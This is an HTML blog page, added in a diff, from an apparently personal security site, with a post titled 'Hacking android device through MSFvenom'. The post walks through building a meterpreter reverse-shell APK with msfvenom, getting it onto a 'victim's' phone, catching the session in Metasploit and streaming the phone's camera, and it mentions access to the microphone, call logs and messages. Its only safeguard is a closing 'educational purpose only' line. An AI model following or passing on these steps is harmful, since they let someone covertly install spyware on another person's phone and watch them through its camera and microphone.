@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+
+	<title>Chejarla Santosh Kumar</title>
+	<link href="my logo.jpg" rel="icon" type="image/jpg" />
+	<!-- Google font -->
+	<link href="https://fonts.googleapis.com/css?family=Montserrat:400,700%7CVarela+Round" rel="stylesheet">
+
+	<!-- Bootstrap -->
+	<link type="text/css" rel="stylesheet" href="css/bootstrap.min.css" />
+
+	<!-- Owl Carousel -->
+	<link type="text/css" rel="stylesheet" href="css/owl.carousel.css" />
+	<link type="text/css" rel="stylesheet" href="css/owl.theme.default.css" />
+
+	<!-- Magnific Popup -->
+	<link type="text/css" rel="stylesheet" href="css/magnific-popup.css" />
+
+	<!-- Font Awesome Icon -->
+	<link rel="stylesheet" href="css/font-awesome.min.css">
+
+	<!-- Custom stlylesheet -->
+	<link type="text/css" rel="stylesheet" href="css/style.css" />
+
+	<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+	<!--[if lt IE 9]>
+		<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+		<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+	<![endif]-->
+</head>
+
+<body>
+
+	<!-- Header -->
+	<header>
+
+		<!-- Nav -->
+		<nav id="nav" class="navbar">
+			<div class="container">
+
+				<div class="navbar-header">
+					<!-- Logo -->
+					<div class="navbar-brand">
+						<a href="index.html">
+							<img class="logo" src="img/my logo.jpg" alt="logo">
+						</a>
+					</div>
+					<!-- /Logo -->
+
+					<!-- Collapse nav button -->
+					<div class="nav-collapse">
+						<span></span>
+					</div>
+					<!-- /Collapse nav button -->
+				</div>
+
+				<!--  Main navigation  -->
+				<ul class="main-nav nav navbar-nav navbar-right">
+					<li><a href="index.html">Home</a></li>
+					<li><a href="web-intro.html">Web exploitation</a></li>
+					<li><a href="recon.html">Recon</a></li>
+					<li><a href="android.html">Android exploitation</a></li>
+					<li><a href="random.html">Random stuff</a></li>
+                    <li><a href="CV/resume.html" >Resume</a></li>
+					<li><a href="index.html#contact">Contact</a></li>
+				</ul>
+				<!-- /Main navigation -->
+
+			</div>
+		</nav>
+		<!-- /Nav -->
+
+		<!-- header wrapper -->
+		<div class="header-wrapper sm-padding bg-grey">
+			<div class="container">
+				<h2>Android exploitation</h2>
+				<ul class="breadcrumb">
+					<li class="breadcrumb-item"><a href="index.html">Home</a></li>
+                    <li class="breadcrumb-item"><a href="android.html">android</a></li>
+                    <li class="breadcrumb-item"><a href="android.html">Metasploit exploit</a></li>
+				</ul>
+			</div>
+		</div>
+		<!-- /header wrapper -->
+
+	</header>
+	<!-- /Header -->
+
+	<!-- Blog -->
+	<div id="blog" class="section md-padding">
+
+		<!-- Container -->
+		<div class="container">
+
+			<!-- Row -->
+			<div class="row">
+
+				<!-- Main -->
+				<main id="main" class="col-md-9">
+					<div class="blog">
+						<div class="blog-img">
+							<img class="img-responsive" src="./img/android/metasploit-og.png" width="800em" alt="">
+						</div>
+						<div class="blog-content">
+							<ul class="blog-meta">
+								<li><i class="fa fa-user"></i>CHS</li>
+								<li><i class="fa fa-clock-o"></i>29th Jul 2018</li>
+								<!--<li><i class="fa fa-comments"></i>57</li>-->
+							</ul>
+                            <h1 id="hackingandroiddevicethroughmsfvenom">Hacking android device through MSFvenom</h1>
+
+<p>Recently I came across this awesome payload from msfvenom which give you access to control the front and back camera, microphone, check victims call log, messages etc. Thought its worth sharing, here is what  to do :</p>
+
+<h3 id="thingsrequired">Things required</h3>
+
+<ul>
+<li>1. Linux machine with Metasploit in it</li>
+
+<li>2. A medium to transfer the payload to victims phone (USB, google drive etc. Gmail won't work) </li>
+
+<li>3. victims phone to install the created apk (doesn't take much time probably less than 1 min)</li>
+</ul>
+
+<h2 id="process">Process</h2>
+
+<p>open the terminal and enter the command : </p>
+
+<pre><code class="bash  language-bash ">msfvenom –p android/meterpreter/reverse_tcp LHOST=**Your IP addr.** LPORT=4444 R &gt; pentest.apk
+</code></pre>
+
+<p>You will find the apk file ready in the directory you created it. The only this left is to transfer it the victims phone and install it. Once the installation is done come back to your system and open the msfconsole</p>
+
+<pre><code class="bash language-bash">msfconsole
+</code></pre>
+
+<p><img src="img/android/msf1.png" alt="msfconsole" width="845em"></p>
+
+<p>Once you are in Metasploit</p>
+
+<p>run the following commands : </p>
+
+<pre><code class="bash language-bash">use multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST **YOUR_IP_addr.**
+set LPORT 4444
+exploit
+</code></pre>
+
+<p><img src="img/android/msf3.png" alt="msfconsole" width="845em" /></p>
+
+<p>Then you will get a meterpreter session. You can type help to see the commands you can enter. Let's try to access the camera of the victim</p>
+
+<pre><code class="bash language-bash">webcam-list
+</code></pre>
+
+<p>
+you can see the cameras. For me, they are Back Camera and Front Camera
+<br>
+Let's try to access back camera</p>
+
+<pre><code class="bash language-bash">webcam_stream Back Camera   
+</code></pre>
+
+<p><img src="img/android/msf5.png" alt="msfconsole" width="845em"/></p>
+
+<p>Then your browser will pop us showing us the live stream from the victims back cam.
+<br>
+There are many options to mess up with the victim's phone.Try to explore your self :)</p>
+
+<hr />
+
+						<!-- blog author -->
+						<div class="blog-author">
+							<div class="media">
+								<div class="media-left">
+									<img class="media-object" src="my logo.jpg" height="150em" alt="">
+								</div>
+								<div class="media-body">
+									<div class="media-heading">
+										<h3>CHS</h3>
+										<div class="author-social">
+											<a href="https://www.facebook.com/ch.santoshkumar211"><i class="fa fa-facebook"></i></a>
+											<a href="https://twitter.com/ch_santoshkumar"><i class="fa fa-twitter"></i></a>
+											<a href="https://www.linkedin.com/in/santosh-kumar-chejarla-ba399614b/"><i class="fa fa-linkedin"></i></a>
+											<a href="https://github.com/chsantoshkumar211"><i class="fa fa-github"></i></a>
+										</div>
+									</div>
+									<p>Here victims phone means a phone to test not a real persons phone.This post is for educational purpose only don't try it on others phones.</p>
+								</div>
+							</div>
+						</div>
+						<!-- /blog author -->
+
+					</div>
+				</main>
+				<!-- /Main -->
+
+
+				<!-- Aside -->
+				<aside id="aside" class="col-md-3">
+
+
+					<!-- Category -->
+					<div class="widget">
+                            <h3 class="title">Topics</h3>
+                            <div class="widget-category">
+								<a href="android-reverse_tcp.html">Hacking android with metasploit</a>
+                                <!--
+                                <a href="#">Web Development<span>(74)</span></a>
+                                <a href="#">Branding<span>(60)</span></a>
+                                <a href="#">Photography<span>(5)</span></a>
+                                -->
+                            </div>
+                        </div>
+					<!-- /Category -->
+
+				</aside>
+				<!-- /Aside -->
+
+			</div>
+			<!-- /Row -->
+
+		</div>
+		<!-- /Container -->
+
+	</div>
+	<!-- /Blog -->
+
+	<!-- Footer -->
+	<footer id="footer" class="sm-padding bg-dark">
+
+		<!-- Container -->
+		<div class="container">
+
+			<!-- Row -->
+			<div class="row">
+
+				<div class="col-md-12">
+
+					<!-- footer logo -->
+					<div class="footer-logo">
+						<a href="index.html"><img src="img/my logo.jpg" alt="logo"></a>
+					</div>
+					<!-- /footer logo -->
+
+					<!-- footer follow -->
+					<ul class="footer-follow">
+						<li><a href="https://www.facebook.com/vinay.koppuravuri.3"><i class="fa fa-facebook"></i></a></li>
+						<li><a href="https://twitter.com/vinayb173"><i class="fa fa-twitter"></i></a></li>
+						<li><a href="https://www.linkedin.com/in/vinay-kumar-7a428a155/"><i class="fa fa-linkedin"></i></a></li>
+						<li><a href="https://github.com/vinayb173"><i class="fa fa-github"></i></a></li>
+					</ul>
+					<!-- /footer follow -->
+
+					<!-- footer copyright -->
+					<div class="footer-copyright">
+						<p>Copyright © 2017. All Rights Reserved. Designed by <a href="https://colorlib.com" target="_blank">Colorlib</a></p>
+					</div>
+					<!-- /footer copyright -->
+
+				</div>
+
+			</div>
+			<!-- /Row -->
+
+		</div>
+		<!-- /Container -->
+
+	</footer>
+	<!-- /Footer -->
+
+	<!-- Back to top -->
+	<div id="back-to-top"></div>
+	<!-- /Back to top -->
+
+	<!-- Preloader -->
+	<div id="preloader">
+		<div class="preloader">
+			<span></span>
+			<span></span>
+			<span></span>
+			<span></span>
+		</div>
+	</div>
+	<!-- /Preloader -->
+
+	<!-- jQuery Plugins -->
+	<script type="text/javascript" src="js/jquery.min.js"></script>
+	<script type="text/javascript" src="js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="js/owl.carousel.min.js"></script>
+	<script type="text/javascript" src="js/jquery.magnific-popup.js"></script>
+	<script type="text/javascript" src="js/main.js"></script>
+
+</body>
+
+</html>
